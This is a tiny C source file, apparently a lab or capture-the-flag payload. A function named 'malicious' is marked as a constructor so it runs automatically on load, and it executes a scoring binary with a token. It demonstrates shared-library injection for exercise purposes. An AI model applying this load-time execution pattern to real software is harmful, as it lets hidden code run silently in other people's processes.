#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score ae2a9405-3d92-4dfe-847e-932fc2743eb8");
}



